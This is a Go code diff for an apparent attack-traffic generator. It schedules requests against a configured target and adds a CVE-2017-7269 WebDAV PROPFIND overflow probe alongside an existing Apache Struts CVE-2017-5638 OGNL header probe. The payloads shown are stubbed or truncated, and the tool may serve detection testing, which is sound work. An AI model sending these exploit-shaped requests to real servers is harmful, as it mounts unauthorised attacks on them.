@@ -122,6 +122,10 @@ func (p *program) Start(s service.Service) error {
 	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 0, minNap: 0, pause: 1,
 		maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/", target),
 		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0","Content-Type": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?)multipart/form-data"}}
+	cve20177269  = Attack{name: "cve20177269", method: "PROPFIND", maxNap: 0, minNap: 0, pause: 1,
+		maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/", target),
+		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0","If": "<http://1234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234>"}}
+
 	
 	/* Attack Tools */
 	niktoBlast = Tool{name: "Nikto Blast", location: "nikto/program/nikto.pl", host: target}
@@ -137,17 +141,17 @@ func (p *program) run() {
 	c = cron.New()
 
 	/* Every 1 minute */
-	c.AddFunc("0 */1 * * * *", func() { cve20175638.send() })	
+	c.AddFunc("0 */25 * * * *", func() { cve20177269.send() })
 	
 	/* Every 5th minute */
 
 	
-	/* REMOVE Every 10th minute */
-	
+	/* Every 10th minute */
+	c.AddFunc("0 */10 * * * *", func() { cve20175638.send() })	
 	
 	/* REMOVE Every 15th minute */
 	
-	/* REMOVE Every 25th minute */
+	/* Every 25th minute */
 	c.AddFunc("0 */25 * * * *", func() { auth.send() })
 	c.AddFunc("0 */25 * * * *", func() { cve20175638.send() })
 	
@@ -240,7 +244,10 @@ func (attack *Attack) send() {
 	
 	} else if attack.name == "cve20175638" {
 		Info.Println(fmt.Sprintf("Executing %s attack: method,url,body %s %s %s", attack.name, attack.method, attack.url, attack.body))
-		attack.link(5, req)
+		attack.link(2, req)
+	} else if attack.name == "cve20177269" {
+		Info.Println(fmt.Sprintf("Executing %s attack: method,url,body %s %s %s", attack.name, attack.method, attack.url, attack.body))
+		attack.link(2, req)
 
 	} else if attack.name == "Open Redirect" {
 		attack.redirect(req)
